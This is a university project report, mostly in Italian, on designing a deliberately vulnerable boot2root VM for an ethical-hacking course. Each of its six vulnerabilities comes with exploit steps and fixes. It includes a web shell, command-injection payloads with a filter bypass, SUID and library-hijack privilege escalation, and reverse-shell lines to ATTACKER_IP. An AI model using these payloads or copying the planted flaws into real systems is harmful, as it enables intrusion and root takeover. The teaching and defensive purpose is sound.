# Boot2Root VM Design: Waifu Gallery – Artificial Vulnerability Orchestration

## Progetto Accademico: Progettazione e Implementazione di un Ambiente Vulnerabile Controllato

**Contexto del Progetto:**
- **Ateneo:** Sapienza Università di Roma, Corso di Laurea Magistrale in Cybersecurity
- **Corso:** Ethical Hacking & Penetration Testing (A.A. 2023/24)
- **Target:** Progettazione di una macchina virtuale vulnerabile destinata a simulazioni didattiche in ambiente d'esame
- **Deliverable:** VM Linux funzionante + Report tecnico ufficiale + Codice sorgente


**Tecnologie & Stack:**
- **Sistema Operativo:** Ubuntu 20.04.6 LTS
- **Web Stack:** Apache2 + PHP
- **Backend Logic:** Bash scripting, C (compilazione di exploit)
- **Vulnerabilità Implementate:** 6 distinte (3 Access Vectors, 3 Privilege Escalation), livelli Easy/Medium/Hard
- **Infrastructure:** Git versioning per tracking

---

## 1. Concept & Architettura del Sistema

### 1.1 Come l'Abbiamo Pensata

La VM doveva essere basata su un vero e plausibile server, quindi era necessario che:

1. **Fosse realistica** – Abbiamo deciso di ispirarci ad una web gallery di inizio 2000, poiché sembrava una soluzione ottimale per avere una tipologia di web app conosciuta e non eccessivamente complessa.
2. **Avesse una trama** – Il tema anime è stato pensato sapendo che il prof. fosse un appassionato: inoltre, vi è una sorta di narrazione interna con vari easter egg ed indizi nascosti.
3. **Fosse progressivo** – Vulnerabilità Easy per capire il flow, Medium per imparare il bypass per l'RCE, Hard per aver fatto una corretta enumerazione e bypass filtro per LFI.

**La Scelta: Waifu Gallery**
Una board di personaggi anime dagli anni '90 a metà 2000. Perché? Perché è credibile, è un web service che effettivamente è stata una cosa e continuano ad esistere ed essere frequentati, gli studenti sapevano già di cosa parlavamo e non vi era un'eccessiva macchinosità del servizio che avrebbe causato rallentamenti del flow inutili. 

### 1.2 Architettura: Dove Abbiamo Messo Cosa

Ogni vulnerabilità doveva stare in un posto specifico del sistema, in modo da favorire un'esplorazione da parte dell'attaccante:

| Componente | Cosa È | Dove Attaccare |
|---|---|---|
| **Frontend** | Galleria PHP con barra ricerca | Web Command Injection (search bar) |
| **Upload nascosto** | imposter.php (non linkato) | File Upload bypass doppia estensione |
| **Backend Filters** | Blacklist comandi +regex | Bypassabile con `;;` e `##` |
| **System User** | `amogus` con password `sus1` | SSH brute-force (nome scopribile da hint UI) |
| **hping3 SUID** | Binary con bit SUID attivo | Root shell istantanea |
| **Cronjob** | Script scrivibile, eseguito come root | PATH hijacking |
| **ld.so config** | Libreria in path scrivibile | Library hijacking + assembly custom |

**Progressione pensata:**
- **Easy:** Scopri l'utente dalla UI => brute-force SSH => trovi SUID hping3
- **Medium:** Bypassa il filtro di ricerca web => scopri il cronjob, modifichi e aspetti per la root rev. shell
- **Hard:** Trovi imposter.php e busti il filtro upload => crei la libreria in C malevola, la sostituisci, hijacki ld.so

---

## 2. Vulnerability Landscape & Exploitation Chains

### 2.1 Vulnerability Summary Matrix

| #  | Nome Vulnerabilità | Categoria | Difficoltà | Prerequisiti | Post-Exploitation |
|----|----|---|---|---|---|
| **3.1** | Weak SSH Credentials | Initial Access | ⭐ EASY | Nessuno (brute-force pubblico) | Shell utente `amogus` |
| **3.2** | Web Command Injection | RCE | ⭐⭐ MEDIUM | Accesso a web app (default) | RCE come www-data user |
| **3.3** | File Upload + Shell Execution | LFI | ⭐⭐⭐ HARD | Riconoscimento pagina nascosta + upload bypass + esecuzione | Shell www-data + persistent backdoor |
| **4.1** | SUID Binary Exploitation (hping3) | Privilege Escalation | ⭐ EASY | Shell utente non-root | Shell root immediata |
| **4.2** | Insecure Cronjob PATH | Privilege Escalation | ⭐⭐ MEDIUM | Accesso utente + attesa timing | Shell root (da reverse shell) |
| **4.3** | LD_LIBRARY_PATH Hijacking | Privilege Escalation | ⭐⭐⭐ HARD | SUID binary + writable library path + C compilation skills | Shell root |

### 2.2 Attack Chain Visualization

```
┌────────────────────────────────────────────────────────┐
│ INITIAL ACCESS                                         │
│ ├─ [3.1] SSH brute-force (amogus:sus1)     ← Easiest   │
│ └─ [3.1] HTTP Reconnaissance → UI hints                │
└────────────────────┬───────────────────────────────────┘
                     │
                     ▼
┌────────────────────────────────────────────────────────┐
│ LATERAL MOVEMENT / WEB RCE                             │
│ ├─ [3.2] Command Injection via search bar  ← Via ;;##  │
│ │         shell_exec() bypass                          │
│ └─ [3.3] Hidden upload page (imposter.php)             │
│          shell.php.jpg double extension bypass         │
└────────────────────┬───────────────────────────────────┘
                     │
                     ▼
┌────────────────────────────────────────────────────────┐
│ PRIVILEGE ESCALATION (Choose One)                      │
│ ├─ [4.1] SUID hping3 → /bin/sh -p          ← Easy      │
│ ├─ [4.2] Cronjob PATH manipulation                     │
│ └─ [4.3] LD_LIBRARY_PATH hijacking         ← Hard      │
└────────────────────────────────────────────────────────┘
```

**Chiave Didattica:**
Ogni livello dimostra concetti reali riscontrati in engagement professionali:
- **Easy:** Reconnaissance basica + weak credentials + OSINT
- **Medium:** Sanitizzazione insufficiente + misunderstanding di shell metacharacters
- **Hard:** Understanding profondo di ELF loader + exploitation of complex privilege boundaries

---

## 3. Vulnerabilità di Accesso (Implementazione Personale)

In questa sezione vengono descritti i vettori di ingresso progettati e implementati per consentire all'attaccante di ottenere il primo accesso al sistema.

### 3.1 Weak SSH Credentials – Easy Mode

#### Setup
L'utente `amogus` con password `sus1` è il primo indizio. Il nome è un riferimento ad Among Us (il gioco), che all'epoca era famoso nei nostri gruppi di studio. Sapevamo che gli altri studenti lo avrebbero riconosciuto.

La password non è nella UI da nessuna parte, ma il nome sì: aprendo il DevTool randomicamente una delle immagini sarà come segue:
```html
<img src="..." title="amogus" ...>
```

Inoltre, è presente un indizio visivo nascosto nella home page: viene scelta randomicamente un'immgine nella griglia tra le ultime righe, facendo hovering del puntatore, apparirà in trasparenza l'Ascii art di _Among Us_. L'indizio è stato messo per premiare la ricerca immagine per immagine, essendo inoltre la sua posizione randomica. 

Quindi per risolvere questa vulnerabilità serve:
1. Osservare la UI (aprire inspector del browser)
2. Identificare il titolo nascosto
3. Tentare brute-force su SSH con quel nome

#### L'Exploit
```bash
# Reconnaissance: passa il mouse su un'immagine, vedi il tooltip
# Oppure F12 → Inspector, cerca title attribute

# Brute-force SSH (o dictionary per soluzione quasi istantanea)
hydra -l amogus -P wordlist.txt ssh://<vm_ip>
# In seguito: ssh amogus@<vm_ip> con password "sus1"
```
vai s
È Easy perché non c'è logica nascosta: il nome è visibile in UI, la password è banale. L'unico "sforzo" è capire che devi usare SSH, anche perché nella web app non ci sono moduli di login o altro. Inoltre, *sus* è il termine più connesso ad _amogus_, quindi la creazione della wordlist è molto rapida.

### 3.2 Web Command Injection – Medium Mode

#### La Vulnerabilità
La search bar fa ricerca di immagini con `shell_exec("ls $image_folder$query*.jpg")`.Il filtro era blacklist-based: blocca `bash`, `nc`, `wget`, comandi specifici. Però abbiamo volutamente lasciato un buco.

Se usi `;` o `#` direttamente, questi vengono bloccati. MA se usi `;;` o `##`, il filtro riconosce solo il primo tralasciando il secondo carattere permettendo l'injection del codice. Poi c'è un `str_replace()` che li converte in singoli (inserito per comodità nell'esecuzione del RCE, senza creare difficoltà artificiale):
```php
if (strpos($query, ";;") !== false && strpos($query, "##") !== false) {
    $query = str_replace(";;", ";", $query);    // ;; -> ;
    $query = str_replace("##", "#", $query);    // ## -> #
}
```

Il controllo avviene PRIMA della sostituzione. Quindi `;;ls /##` passa il filtro perché `;;` non è `;`, non viene bloccato. Fosse stato effettuato DOPO, sarebbe stato bloccato, cosa che avviene per tutte le altre tipologie di injection.

#### Come Risolverla
```bash
# Payload diretti
;;ls /##             # Elenca root directory
;;cat /etc/passwd##  # Legge file sensibili
;;whoami##           # Vedi chi sei

# Payload più complessi (reverse shell):
;;bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1##
```

**Difesa:**
Non usare `shell_exec` con input user. O se lo fai:
1. **Whitelist** – accetta solo caratteri sicuri: `preg_replace('/[^a-zA-Z0-9_-]/', '', $query)`
2. **escapeshellarg()** – se proprio devi usare shell_exec: `escapeshellarg($query)`
3. **Meglio: PHP native** – `glob("images/{$query}*.jpg")` senza shell

### 3.3 File Upload Bypass – Hard Mode

#### L'Idea
Abbiamo creato una pagina nascosta `imposter.php` che non è linkata da nessuna parte. Se la trovi e accedi, puoi uploadare un file.

Il filtro controlla solo l'estensione finale via `pathinfo()`. Quindi:
- `shell.php.jpg` → estensione = `.jpg` ✅ passa il filtro
- Ma il file si salva come `shell.php.jpg` e se Apache lo esegue come PHP → RCE

#### Come la Trovi
```bash
# 1. Brute force
gobuster dir -u http://<vm_ip> -w /usr/share/wordlists/common.txt
# Scopri imposter.php

# 2. O se hai RCE dalla command injection:
cat index.php | grep -i "upload\|form\|POST"  # Find links to imposter.php
```

#### L'Exploit
```bash
# Crea una web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Rinomina con doppia estensione
mv shell.php shell.php.jpg

# Upload
curl -F "image=@shell.php.jpg" http://<vm_ip>/imposter.php

# Esegui
curl "http://<vm_ip>/images/shell.php.jpg?cmd=id"
# uid=33(www-data) ...
```

#### Difesa
1. **Controlla magic bytes** – Non extension. `getimagesize()` verifica se è davvero un'immagine
2. **Rinomina il file** - Genera nome random: `bin2hex(random_bytes(16)) . ".jpg"`
3. **Store outside webroot** - Salva in `/var/uploads/`, non dove Apache può eseguire
4. **Disabilita PHP execution** nella cartella upload (.htaccess o web.config)

## 4. Privilege Escalation – Come Diventare Root

### 4.1 SUID hping3 – Easy

#### Cos'è hping3?
`hping3` è un packet crafting tool, simile a `ping` ma con stereoidi. Si usa per testare firewall, creare pacchetti custom, roba così. NON dovrebbe mai avere SUID.

#### L'Exploit
```bash
# Enumerare SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep hping
# Output: /usr/sbin/hping3

# Eseguire hping3 (che è SUID root)
$ /usr/sbin/hping3
hping3 > /bin/sh -p

# Boom, sei root
$ whoami
root
```

La flag `-p` di `/bin/sh` è critica: "preserve mode". Senza, la shell droppa i privilegi automaticamente.

#### Perché funziona
`hping3` con SUID esegue come root. Dentro hping3 c'è una funzionalità di shell escape. Chiedi una shell, e il processo (che è root) te la dà. Easy.

#### Difesa
```bash
# Remove SUID
chmod -s /usr/sbin/hping3

# Oppure usare sudo con logging
```

### 4.2 Cronjob PATH Hijacking – Medium

#### Come Funziona
Cronjob (cron) è un Linux scheduler che esegue scripts periodicamente. Se:
- Lo script viene eseguito **come root** ma è **scrivibile da non-root**
- E usa **path relativo** per eseguire comandi

Allora dirottiamo gli eseguibili aggiungendo una directory fake al PATH dove creiamo eseguibili nostri con lo stesso nome. Quando cron esegue il comando, trova il nostro fake.

#### Vulnerability Discovery Phase

**Step 1: Identify the "overwrite.sh" script**
```bash
find / -name "overwrite.sh" -type f -writable 2>/dev/null
# Output: /home/developer/overwrite.sh
# Permissions: -rw-rw-r-- (writable by non-root!)
```

**Step 2: Examine the script content**
```bash
cat /home/developer/overwrite.sh
# Output uses RELATIVE paths:
# ls /          (instead of: /bin/ls /)
# whoami        (instead of: /usr/bin/whoami)
# id            (instead of: /usr/bin/id)
```

#### The Vulnerability: Relative vs Absolute Paths

**How PATH hijacking works:**
When cron executes the script with PATH like `/home/developer:/usr/bin:/bin`:
```
When script executes: ls
System searches:
1. /home/developer/ls        ← Attacker CREATES THIS
2. /usr/bin/ls
3. /bin/ls

Result: Attacker's malicious /home/developer/ls executes as root!
```

#### Exploitation Chain

**Step 1: Create malicious executable**
```bash
cat > /home/developer/ls << 'EOF'
#!/bin/bash
# This will execute as ROOT because cron runs as root!
bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1
EOF
chmod +x /home/developer/ls
```

**Step 2: Set up listener**
```bash
nc -lnvp 7777
# Waiting for reverse shell...
```

**Step 3: Wait for cron execution**
```bash
# Cron will execute overwrite.sh at scheduled time (e.g., every minute)
# When it runs "ls /" inside the script:
# It looks for "ls" in PATH
# Finds /home/developer/ls
# Executes OUR malicious script as root
```

**Step 4: Get root shell**
```bash
root@vm:/# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Remediation (Multi-Layered)

**Layer 1: Use absolute paths in scripts (PRIMARY)**
```bash
#!/bin/bash
# SECURE: All paths are absolute
/bin/ls /
/usr/bin/whoami
/usr/bin/id
/bin/cat /etc/passwd
```

**Layer 2: Set restrictive PATH in cronjob**
```cron
# In /etc/cron.d/example:
PATH=/bin:/usr/bin
SHELL=/bin/bash
* * * * * root /home/developer/overwrite.sh > /dev/null 2>&1
```

**Layer 3: Make scripts non-writable by non-root**
```bash
chmod 750 /home/developer/overwrite.sh
# Now only owner (root) and group can modify
``` 

### 4.3 LD.SO Hijacking – Hard

#### Come Funziona L'ELF Loader
L'ELF loader (`ld.so`) risolve le librerie dinamiche che un programma necessita a runtime. Segue un ordine di ricerca specifico:

```bash
1. LD_LIBRARY_PATH (variabile ambiente)
2. /etc/ld.so.cache (cache compilata)
3. /etc/ld.so.conf e /etc/ld.so.conf.d/ (config di sistema)
4. Standard dirs: /lib, /usr/lib, /lib64, /usr/lib64
```

Se un binary SUID cerca una libreria in una directory **scrivibile**, possiamo mettere lì la nostra versione malware e il binary SUID la carica.

#### Discovery: Finding the Vulnerable Binary

**Step 1: Check for non-standard library paths**
```bash
# Check /etc/ld.so.conf.d/ for unusual paths:
ls -la /etc/ld.so.conf.d/
cat /etc/ld.so.conf.d/* | grep -v "^#"
# Output might include: /home/developer/libs

# Verify if path is writable by non-root:
ls -la /home/developer/libs
# Output: drwxrwxr-x 1 root www-data (www-data can write here!)
```

**Step 2: Find SUID binary with missing library**
```bash
find / -perm -4000 -type f 2>/dev/null

# For each binary, check what libraries it needs:
ldd /usr/sbin/testingapp
# Output example:
#   libcustomapp.so => not found              ← MISSING LIBRARY!
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

#### The Exploit: Creating Malicious Library

**Step 1: Create malicious libcustomapp.so**
```c
// malicious_libcustomapp.c
#include <unistd.h>
void functionLoader() {
    setuid(0);      // Set UID to root
    setgid(0);      // Set GID to root
    system("/bin/sh");  // Spawn shell as root
}
```

**Step 2: Compile the malicious library**
```bash
gcc -shared -fPIC -o libcustomapp.so malicious_libcustomapp.c

# Verify it was created:
file libcustomapp.so
```

**Step 3: Place library in the vulnerable directory**
```bash
cp libcustomapp.so /home/developer/libs/

# Verify placement:
ls -la /home/developer/libs/libcustomapp.so
```

**Step 4: Execute the vulnerable binary**
```bash
/usr/sbin/testingapp

# What happens:
# 1. testingapp starts (SUID means it runs as root)
# 2. ELF loader searches for libcustomapp.so
# 3. Finds our malicious /home/developer/libs/libcustomapp.so FIRST
# 4. Loads OUR library which calls setuid(0) + system("/bin/sh")
# 5. Shell prompt appears as root!

# Result:
# # whoami
# root
```

#### Remediation (Hardening)

**Layer 1: Use absolute paths + remove unsafe entries**
```bash
# Remove or comment out:
cat /etc/ld.so.conf.d/custom.conf
# /home/developer/libs   ← REMOVE THIS

# Rebuild the loader cache:
sudo ldconfig
```

**Layer 2: Remove SUID bit**
```bash
chmod -s /usr/sbin/testingapp
```

**Layer 3: Make library directories read-only**
```bash
chmod 555 /home/developer/libs
```

**Layer 4: Force RPATH (static library path)**
```bash
# When compiling, use -Wl,-rpath:
gcc -o testingapp testingapp.c -lcustomapp -Wl,-rpath=/usr/local/lib/secure
# Binary looks ONLY in /usr/local/lib/secure
# Ignores LD_LIBRARY_PATH and /etc/ld.so.conf.d/
```

## 5. Come Ripararlo – Strategie di Defense

### 5.1 Priorità di Fix

| Vulnerabilità | Severity | Remediation Primary | Tempo Impl. | Effort | Collaudo |
|---|---|---|---|---|---|
| 3.1 (Weak SSH) | CRITICAL | SSH key-based + strong policy | 2 hrs | LOW | `ssh-keygen -t ed25519` |
| 3.2 (Cmd Inject) | CRITICAL | Sanitize input + use whitelist | 4 hrs | MEDIUM | `escapeshellarg()` test |
| 3.3 (Upload RCE) | CRITICAL | Magic bytes + disable PHP in upload dir | 3 hrs | MEDIUM | File upload test |
| 4.1 (SUID hping3) | HIGH | Remove SUID bit | 15 min | LOW | `find / -perm -4000` |
| 4.2 (Cronjob) | HIGH | Absolute paths + restrictive PATH | 1 hr | MEDIUM | Monitor cron execution |
| 4.3 (ld.so) | HIGH | Remove unsafe ld.so.conf.d entries | 30 min | LOW | Verify ld.so.conf.d |

### 5.2 La Strategia Di Difesa

**Da Fare Subito (Riparare le Vulnerabilità Web):**
1. Non usare funzioni pericolose come `shell_exec()` senza sanitizing
2. Se proprio necessario, whitelist solo i caratteri sicuri (lettere, numeri, wildcard `*`)
3. Upload files: controlla magic bytes, non solo estensione
4. Disabilita PHP in `/images/` con `.htaccess` (Apache) o nginx config

**Dopo (Elimina i Privilege Escalation):**
5. Togli SUID da binari non necessari
6. SSH: usa solo key-based auth, password disabled
7. Cronjob: sempre path assoluto, mai relativo
8. LD.SO: audita `/etc/ld.so.conf.d/`, rimuovi path user-writable
9. Controllo mensile di SUID binary con `find / -perm -4000`

**Ongoing (Monitoraggio):**
10. Scan di web input periodicamente
11. Audit file permission (monthly)
12. Log analysis per accessi non autorizzati
